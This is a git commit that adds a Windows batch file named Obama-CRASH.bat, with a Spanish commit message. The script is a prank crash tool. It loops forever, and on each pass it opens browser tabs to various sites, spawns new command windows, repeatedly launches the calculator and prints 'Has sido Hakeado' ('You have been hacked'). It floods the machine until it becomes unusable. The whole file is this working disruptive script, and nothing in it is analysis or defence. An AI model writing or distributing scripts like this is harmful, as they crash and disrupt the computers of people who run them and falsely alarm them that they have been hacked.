35fe31d90b7a04099cf38753973c8fa4b40cc6dd
FIRESLIM <91010497+Hgprogram06@users.noreply.github.com>
2021-11-07 11:27:32 +0100

    Aquí está el código

---
+++ Obama-CRASH.bat
@@ -0,0 +1,93 @@
+@echo off
+echo.
+echo.
+echo.
+:inicio
+start https://github.com/
+echo.
+start
+echo.
+start calc
+echo.
+start https://www.google.com/search?q=beagle&sxsrf=AOaemvK_KBevWf-j7QcRwjNEeErpmkdnOw:1635226421673&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiMsPaPrefzAhWPFMAKHcjGAOcQ_AUoAXoECAEQAw&biw=1316&bih=672&dpr=1#imgrc=kCzEtbk9Kz7HmM
+echo.
+start
+echo.
+start calc
+echo.
+start https://store.steampowered.com/?l=spanish
+echo.
+echo.
+start
+echo.
+start calc
+echo.
+echo.
+start https://www.youtube.com/
+echo.
+start
+echo.
+start calc
+echo.
+start https://www.torproject.org/
+echo.
+echo.
+start
+echo.
+echo.
+start https://www.adslzone.net/app/uploads-adslzone.net/2017/01/hacked.jpg
+echo.
+echo.
+start
+echo.
+start calc
+echo.
+echo Has sido Hakeado
+echo.
+start https://es.wikipedia.org/wiki/The_Million_Dollar_Homepage
+echo.
+echo.
+start
+echo.
+start calc
+echo.
+echo.
+start https://es.wikipedia.org/wiki/Virus_inform%C3%A1tico
+echo.
+echo.
+start
+echo.
+start calc
+echo.
+echo.
+start https://www.adslzone
+echo.
+echo.
+start
+echo.
+start calc
+echo.
+echo.
+start https://www.tabnine.com/
+echo.
+echo.
+start
+echo.
+start calc
+echo.
+echo.
+start https://es-es.facebook.com/
+echo.
+echo.
+start
+echo.
+start calc
+echo.
+echo.
+start https://www.youtube.com/watch?v=3hFDxDYtp8c
+echo.
+start calc
+echo.
+echo.
+echo.
+goto :inicio
